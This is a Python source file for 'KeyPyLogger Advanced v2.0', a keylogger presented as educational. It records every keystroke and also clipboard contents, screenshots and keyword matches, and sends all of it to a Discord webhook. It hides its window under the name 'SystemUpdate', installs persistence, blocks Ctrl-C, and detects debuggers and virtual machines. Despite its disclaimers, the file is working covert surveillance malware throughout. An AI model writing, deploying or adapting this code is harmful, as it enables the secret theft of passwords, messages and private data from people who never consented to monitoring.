#!/usr/bin/env python3
"""
KeyPyLogger Advanced - Educational Keylogger with Advanced Features
LEGAL WARNING: This tool is for educational and authorized security testing only.
Unauthorized use is illegal. Only use on systems you own or have explicit permission to test.

Version 2.0 - Advanced Features Module
"""

import os
import sys
import platform
import threading
import time
import base64
from datetime import datetime
from pynput import keyboard
import requests
import json

# Import advanced modules
try:
    from modules.persistence import PersistenceManager
    from modules.clipboard import ClipboardMonitor
    from modules.screenshot import ScreenshotCapture
    from modules.keyword_alerts import KeywordAlertSystem, PresetKeywordLists
    from modules.watchdog import ProcessMonitor, HealthChecker
    from modules.protection import SelfProtection
    ADVANCED_MODULES_AVAILABLE = True
except ImportError:
    ADVANCED_MODULES_AVAILABLE = False
    print("[!] Advanced modules not found. Running in basic mode.")

# Configuration - Will be replaced by builder
WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER"
SEND_INTERVAL = 60  # Send logs every 60 seconds
MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send

# Advanced Features Configuration
ENABLE_PERSISTENCE = False
ENABLE_CLIPBOARD = False
ENABLE_SCREENSHOTS = False
SCREENSHOT_INTERVAL = 300  # 5 minutes
ENABLE_KEYWORD_ALERTS = False
KEYWORD_LISTS = []  # Will be populated by builder
ENABLE_SELF_PROTECTION = False
ENABLE_HEALTH_MONITORING = False
PROGRAM_NAME = "SystemUpdate"


class AdvancedKeyLogger:
    """
    Advanced keylogger with modular features
    Educational implementation for cybersecurity learning
    """

    def __init__(self, webhook_url, send_interval=60):
        """
        Initialize the advanced keylogger

        Args:
            webhook_url (str): Discord webhook URL
            send_interval (int): Interval in seconds to send logs
        """
        self.webhook_url = webhook_url
        self.send_interval = send_interval
        self.log_buffer = []
        self.running = False
        self.system_info = self._get_system_info()

        # Advanced features
        self.persistence = None
        self.clipboard_monitor = None
        self.screenshot_capture = None
        self.keyword_alerts = None
        self.process_monitor = None
        self.health_checker = None
        self.self_protection = None

        # Data buffers for advanced features
        self.clipboard_buffer = []
        self.screenshot_buffer = []
        self.keyword_alerts_buffer = []

    def _get_system_info(self):
        """Collect basic system information"""
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version()
        }

    def initialize_advanced_features(self):
        """Initialize all enabled advanced features"""
        if not ADVANCED_MODULES_AVAILABLE:
            print("[!] Advanced modules not available")
            return

        print("[*] Initializing advanced features...")

        # 1. Persistence
        if ENABLE_PERSISTENCE:
            try:
                self.persistence = PersistenceManager(
                    program_name=PROGRAM_NAME,
                    hide_location=True
                )

                # Check if already installed
                is_installed, locations = self.persistence.check_installed()

                if not is_installed:
                    success, method, path = self.persistence.install()
                    if success:
                        print(f"[+] Persistence installed: {method}")
                        self._send_notification("PERSISTENCE_INSTALLED", f"Method: {method}, Path: {path}")
                    else:
                        print(f"[!] Persistence failed: {method}")
                else:
                    print(f"[*] Persistence already installed: {locations}")

            except Exception as e:
                print(f"[!] Persistence error: {e}")

        # 2. Clipboard Monitoring
        if ENABLE_CLIPBOARD:
            try:
                self.clipboard_monitor = ClipboardMonitor(
                    callback=self._on_clipboard_change,
                    check_interval=2
                )

                if self.clipboard_monitor.start():
                    print("[+] Clipboard monitoring started")
                else:
                    print("[!] Clipboard monitoring failed to start")

            except Exception as e:
                print(f"[!] Clipboard error: {e}")

        # 3. Screenshot Capture
        if ENABLE_SCREENSHOTS:
            try:
                self.screenshot_capture = ScreenshotCapture(
                    callback=self._on_screenshot_captured,
                    interval=SCREENSHOT_INTERVAL,
                    quality=50,
                    max_size=(800, 600)
                )

                if self.screenshot_capture.start():
                    print(f"[+] Screenshot capture started (interval: {SCREENSHOT_INTERVAL}s)")
                else:
                    print("[!] Screenshot capture failed to start")

            except Exception as e:
                print(f"[!] Screenshot error: {e}")

        # 4. Keyword Alerts
        if ENABLE_KEYWORD_ALERTS and KEYWORD_LISTS:
            try:
                # Combine all keyword lists
                all_keywords = []
                for list_name in KEYWORD_LISTS:
                    preset_lists = PresetKeywordLists.get_all_presets()
                    if list_name in preset_lists:
                        all_keywords.extend(preset_lists[list_name])

                self.keyword_alerts = KeywordAlertSystem(
                    keywords=all_keywords,
                    alert_callback=self._on_keyword_detected,
                    case_sensitive=False
                )

                print(f"[+] Keyword alerts enabled ({len(all_keywords)} keywords)")

            except Exception as e:
                print(f"[!] Keyword alerts error: {e}")

        # 5. Self-Protection
        if ENABLE_SELF_PROTECTION:
            try:
                self.self_protection = SelfProtection(
                    on_tamper_callback=self._on_tamper_detected
                )

                self.self_protection.disable_ctrl_c()
                self.self_protection.hide_window()
                self.self_protection.set_process_priority('low')
                self.self_protection.start_integrity_monitor(check_interval=120)

                # Create mutex to prevent multiple instances
                mutex_created = self.self_protection.create_mutex(f"{PROGRAM_NAME}_Mutex")

                if not mutex_created:
                    print("[!] Another instance already running. Exiting.")
                    sys.exit(0)

                print("[+] Self-protection enabled")

                # Check for debugger/VM
                if self.self_protection.is_debugger_present():
                    print("[!] Debugger detected!")
                    self._send_notification("DEBUGGER_DETECTED", "Debugger is attached")

                if self.self_protection.detect_vm():
                    print("[!] Virtual machine detected!")
                    self._send_notification("VM_DETECTED", "Running in virtual environment")

            except Exception as e:
                print(f"[!] Self-protection error: {e}")

        # 6. Health Monitoring
        if ENABLE_HEALTH_MONITORING:
            try:
                self.process_monitor = ProcessMonitor()
                self.health_checker = HealthChecker(
                    callback=self._on_health_check,
                    check_interval=300  # 5 minutes
                )

                self.health_checker.start()
                print("[+] Health monitoring started")

            except Exception as e:
                print(f"[!] Health monitoring error: {e}")

    def _format_key(self, key):
        """Format key press for logging"""
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                # Special keys formatting
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.shift_r: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.caps_lock: '[CAPS]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                }
                return special_keys.get(key, f'[{str(key).replace("Key.", "")}]')
        except Exception as e:
            return f'[ERROR:{str(e)}]'

    def _on_press(self, key):
        """Callback for key press events"""
        try:
            formatted_key = self._format_key(key)
            self.log_buffer.append(formatted_key)

            # Check for keywords if enabled
            if self.keyword_alerts:
                self.keyword_alerts.process_text(formatted_key)

            # Force send if buffer is too large
            if len(''.join(self.log_buffer)) >= MAX_BUFFER_SIZE:
                self._send_logs()

        except Exception as e:
            print(f"Error in key press handler: {e}")

    def _on_clipboard_change(self, timestamp, content):
        """Callback for clipboard changes"""
        self.clipboard_buffer.append({
            'timestamp': timestamp,
            'content': content
        })

        # Send if buffer has 5+ items
        if len(self.clipboard_buffer) >= 5:
            self._send_clipboard_logs()

    def _on_screenshot_captured(self, timestamp, image_data, size):
        """Callback for captured screenshots"""
        # Convert to base64 for storage/transmission
        image_base64 = base64.b64encode(image_data).decode('utf-8')

        self.screenshot_buffer.append({
            'timestamp': timestamp,
            'size': size,
            'data': image_base64[:100]  # Store only preview for buffer
        })

        # Send screenshot immediately (they're large)
        self._send_screenshot(timestamp, image_data, size)

    def _on_keyword_detected(self, keyword, matched_text, context, timestamp):
        """Callback for keyword detection"""
        alert_data = {
            'timestamp': timestamp,
            'keyword': keyword,
            'matched': matched_text,
            'context': context
        }

        self.keyword_alerts_buffer.append(alert_data)

        # Send alert immediately (high priority)
        self._send_keyword_alert(alert_data)

    def _on_health_check(self, health_info):
        """Callback for health checks"""
        # Send health info periodically
        self._send_health_info(health_info)

    def _on_tamper_detected(self, tamper_type, details):
        """Callback for tampering detection"""
        self._send_notification("TAMPER_DETECTED", f"{tamper_type}: {details}")

    def _send_logs(self):
        """Send accumulated keystroke logs to Discord webhook"""
        if not self.log_buffer:
            return

        try:
            log_content = ''.join(self.log_buffer)

            if not log_content.strip():
                self.log_buffer = []
                return

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            embed = {
                "title": f"⌨️ Keylog Report - {self.system_info['hostname']}",
                "description": f"```\n{log_content[:4000]}\n```",
                "color": 3447003,  # Blue
                "fields": [
                    {"name": "System", "value": f"{self.system_info['os']} {self.system_info['architecture']}", "inline": True},
                    {"name": "Timestamp", "value": timestamp, "inline": True},
                    {"name": "Size", "value": f"{len(log_content)} chars", "inline": True}
                ],
                "footer": {"text": "KeyPyLogger v2.0 - Educational Purpose Only"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            response = requests.post(self.webhook_url, json=payload, timeout=10)

            if response.status_code == 204:
                self.log_buffer = []

        except Exception as e:
            print(f"Error sending logs: {e}")

    def _send_clipboard_logs(self):
        """Send clipboard logs"""
        if not self.clipboard_buffer:
            return

        try:
            # Format clipboard entries
            clipboard_text = "\n---\n".join([
                f"[{item['timestamp'].strftime('%H:%M:%S')}]\n{item['content'][:200]}"
                for item in self.clipboard_buffer
            ])

            embed = {
                "title": f"📋 Clipboard Log - {self.system_info['hostname']}",
                "description": f"```\n{clipboard_text[:4000]}\n```",
                "color": 15844367,  # Gold
                "fields": [
                    {"name": "Items", "value": str(len(self.clipboard_buffer)), "inline": True},
                    {"name": "Timestamp", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True}
                ],
                "footer": {"text": "Clipboard Monitor"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            response = requests.post(self.webhook_url, json=payload, timeout=10)

            if response.status_code == 204:
                self.clipboard_buffer = []

        except Exception as e:
            print(f"Error sending clipboard logs: {e}")

    def _send_screenshot(self, timestamp, image_data, size):
        """Send screenshot to Discord"""
        try:
            # Discord doesn't support inline base64 images in embeds well
            # So we'll send a notification with size info
            # In production, you'd upload to a file host or use Discord attachments

            embed = {
                "title": f"📸 Screenshot Captured - {self.system_info['hostname']}",
                "color": 5763719,  # Green
                "fields": [
                    {"name": "Timestamp", "value": timestamp.strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                    {"name": "Size", "value": f"{size[0]}x{size[1]}", "inline": True},
                    {"name": "File Size", "value": f"{len(image_data) / 1024:.1f} KB", "inline": True}
                ],
                "description": "Screenshot data captured (use file upload for full image)",
                "footer": {"text": "Screenshot Monitor"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            print(f"Error sending screenshot notification: {e}")

    def _send_keyword_alert(self, alert_data):
        """Send keyword alert"""
        try:
            embed = {
                "title": f"🚨 KEYWORD ALERT - {self.system_info['hostname']}",
                "color": 15158332,  # Red
                "fields": [
                    {"name": "Keyword", "value": f"`{alert_data['keyword']}`", "inline": True},
                    {"name": "Matched", "value": f"`{alert_data['matched']}`", "inline": True},
                    {"name": "Timestamp", "value": alert_data['timestamp'].strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
                    {"name": "Context", "value": f"```\n{alert_data['context'][:500]}\n```", "inline": False}
                ],
                "footer": {"text": "Keyword Alert System"}
            }

            payload = {"username": "KeyPyLogger - ALERT", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            print(f"Error sending keyword alert: {e}")

    def _send_health_info(self, health_info):
        """Send health monitoring info"""
        try:
            fields = []
            for key, value in health_info.items():
                if key != 'error':
                    fields.append({
                        "name": key.replace('_', ' ').title(),
                        "value": str(value),
                        "inline": True
                    })

            embed = {
                "title": f"💓 Health Check - {self.system_info['hostname']}",
                "color": 3066993,  # Teal
                "fields": fields,
                "footer": {"text": "Health Monitor"},
                "timestamp": datetime.utcnow().isoformat()
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            print(f"Error sending health info: {e}")

    def _send_notification(self, event_type, details):
        """Send general notification"""
        try:
            embed = {
                "title": f"🔔 {event_type}",
                "description": details,
                "color": 10181046,  # Purple
                "fields": [
                    {"name": "System", "value": self.system_info['hostname'], "inline": True},
                    {"name": "Timestamp", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True}
                ],
                "footer": {"text": "System Notifications"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            print(f"Error sending notification: {e}")

    def _send_initial_info(self):
        """Send initial startup information"""
        try:
            # Collect enabled features
            enabled_features = []
            if ENABLE_PERSISTENCE:
                enabled_features.append("✓ Persistence")
            if ENABLE_CLIPBOARD:
                enabled_features.append("✓ Clipboard")
            if ENABLE_SCREENSHOTS:
                enabled_features.append("✓ Screenshots")
            if ENABLE_KEYWORD_ALERTS:
                enabled_features.append("✓ Keyword Alerts")
            if ENABLE_SELF_PROTECTION:
                enabled_features.append("✓ Self-Protection")
            if ENABLE_HEALTH_MONITORING:
                enabled_features.append("✓ Health Monitoring")

            features_text = "\n".join(enabled_features) if enabled_features else "Basic keylogging only"

            embed = {
                "title": "🚀 KeyPyLogger Started (v2.0 Advanced)",
                "color": 5763719,  # Green
                "fields": [
                    {"name": "Hostname", "value": self.system_info['hostname'], "inline": True},
                    {"name": "OS", "value": self.system_info['os'], "inline": True},
                    {"name": "Architecture", "value": self.system_info['architecture'], "inline": True},
                    {"name": "Enabled Features", "value": features_text, "inline": False}
                ],
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": "KeyPyLogger v2.0 - Educational Purpose Only"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            print(f"Error sending initial info: {e}")

    def _periodic_send(self):
        """Periodically send logs at specified interval"""
        while self.running:
            time.sleep(self.send_interval)
            if self.running:
                self._send_logs()

                # Also send clipboard logs if available
                if self.clipboard_buffer:
                    self._send_clipboard_logs()

    def start(self):
        """Start the keylogger"""
        print(f"[*] Starting KeyPyLogger Advanced on {self.system_info['os']}")
        print(f"[*] Hostname: {self.system_info['hostname']}")

        # Initialize advanced features first
        self.initialize_advanced_features()

        # Send initial system info
        self._send_initial_info()

        # Start periodic send thread
        self.running = True
        send_thread = threading.Thread(target=self._periodic_send, daemon=True)
        send_thread.start()

        # Start keyboard listener
        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[*] Stopping keylogger...")
            self.stop()

    def stop(self):
        """Stop the keylogger and send remaining logs"""
        self.running = False

        # Stop advanced features
        if self.clipboard_monitor:
            self.clipboard_monitor.stop()

        if self.screenshot_capture:
            self.screenshot_capture.stop()

        if self.health_checker:
            self.health_checker.stop()

        if self.self_protection:
            self.self_protection.stop_integrity_monitor()

        # Send any remaining logs
        self._send_logs()
        if self.clipboard_buffer:
            self._send_clipboard_logs()

        print("[*] Keylogger stopped")


def main():
    """Main entry point"""
    # Check if webhook URL is configured
    if WEBHOOK_URL == "WEBHOOK_URL_PLACEHOLDER":
        print("[!] ERROR: Webhook URL not configured!")
        print("[!] Please use builder.py to configure the keylogger")
        sys.exit(1)

    # Legal warning
    print("=" * 70)
    print("KeyPyLogger Advanced v2.0 - Educational Keylogger")
    print("=" * 70)
    print("WARNING: This tool is for EDUCATIONAL and AUTHORIZED testing only!")
    print("Unauthorized use of keyloggers is ILLEGAL and unethical.")
    print("Only use on systems you own or have explicit written permission.")
    print("=" * 70)
    print()

    # Create and start keylogger
    logger = AdvancedKeyLogger(WEBHOOK_URL, SEND_INTERVAL)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        print(f"[!] Error: {e}")
        logger.stop()


if __name__ == "__main__":
    main()
